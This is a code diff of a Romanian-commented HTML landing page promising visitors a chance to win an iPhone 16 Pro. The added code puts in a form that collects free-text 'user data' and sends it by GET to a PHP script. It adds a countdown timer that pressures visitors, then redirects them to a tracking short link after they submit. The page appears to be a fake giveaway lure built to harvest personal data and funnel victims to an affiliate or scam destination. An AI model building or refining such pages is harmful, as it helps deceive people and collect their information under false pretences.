@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="ro">
 <head>
     <meta charset="UTF-8">
@@ -17,13 +17,49 @@
             <p>Join now for a chance to own the latest iPhone.</p>
             <div class="timer" id="timer">60</div>
             <div class="cta-container">
-                <a href="#" class="cta-button" id="cta-button">Sign up now</a>
+                <!-- Formularul pentru colectarea datelor -->
+                <form action="save_data.php" method="GET" id="userForm">
+                    <label for="user_data">Introduceți datele:</label>
+                    <input type="text" id="user_data" name="user_data" required>
+                    <button type="submit" class="cta-button" id="cta-button">Sign up now</button>
+                </form>
                 <img src="iphone.png" alt="iPhone 16 Pro" class="phone-image">
             </div>
         </div>
     </header>
 
-    <!-- Referință către fișierul JS -->
-    <script src="script.js"></script>
+    <!-- Script pentru timer și redirecționare -->
+    <script>
+        let timeLeft = 60;
+        const timerElement = document.getElementById("timer");
+        const ctaButton = document.getElementById("cta-button");
+
+        function updateTimer() {
+            if (timeLeft > 0) {
+                timeLeft--;
+                timerElement.textContent = timeLeft;
+                setTimeout(updateTimer, 1000);
+            } else {
+                timerElement.textContent = "Time Expired!";
+            }
+        }
+        updateTimer();
+
+        // Redirecționare la apăsarea butonului
+        ctaButton.addEventListener("click", function(event) {
+            event.preventDefault();
+            ctaButton.style.transform = "scale(1.2)";
+            ctaButton.style.transition = "transform 0.3s ease-in-out";
+
+            // Începem să trimitem datele înainte de redirecționare
+            const form = document.getElementById('userForm');
+            form.submit();  // Trimitere date către PHP pentru salvare
+
+            // După trimitere, redirecționăm utilizatorul
+            setTimeout(() => {
+                window.location.href = "https://smrturl.co/a/s3f31d3c66e/1549?s1=";
+            }, 300); // Redirecționează la URL-ul dorit după 300 ms
+        });
+    </script>
 </body>
 </html>
